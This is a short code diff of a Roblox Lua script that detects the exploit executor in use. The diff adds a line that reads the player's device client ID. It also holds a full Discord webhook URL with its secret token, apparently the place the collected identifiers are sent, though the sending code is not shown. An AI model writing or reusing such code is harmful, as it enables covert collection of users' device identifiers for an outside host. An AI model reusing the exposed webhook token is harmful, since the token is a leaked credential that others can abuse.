@@ -1,4 +1,5 @@
 local exploits = identifyexecutor()
+local HW = game:GetService("RbxAnalyticsService"):GetClientId()
 
 local url =
    "https://discord.com/api/webhooks/953785291825614929/Vzlid18HyTbZfjolQCW0FXzpQxmspawT7lEOapvpd-LIIY2b19PZKlE5lkQD8t1lFHox"
